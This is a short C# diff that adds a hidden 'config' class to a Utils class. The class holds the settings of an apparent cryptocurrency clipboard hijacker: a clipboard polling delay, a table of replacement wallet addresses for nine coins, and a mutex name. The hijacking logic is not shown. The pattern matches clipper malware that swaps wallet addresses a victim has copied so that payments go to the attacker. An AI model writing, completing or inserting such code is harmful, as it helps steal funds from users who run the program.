@@ -537,5 +537,28 @@ class Utils
             }
             return bytes;
         }
+        internal sealed class config
+        {
+
+            // Clipboard check delay in seconds
+            public static int clipboard_check_delay = 2;
+
+            // Replace 
+            public static Dictionary<string, string> addresses = new Dictionary<string, string>()
+        {
+            {"btc", "" }, // Bitcoin
+            {"eth", "" }, // Ethereum
+            {"xmr", "" }, // Monero
+            {"xlm", "" }, // Stellar
+            {"xrp", "" }, // Ripple
+            {"ltc", "" }, // Litecoin
+            {"nec", "" }, // Neocoin
+            {"bch", "" }, // Bitcoin Cash
+            {"dash", "" } // Dashcoin
+        };
+            // Mutex (random)
+            public static string mutex = "uhbfrsufe";
+
+        }
     }
 }
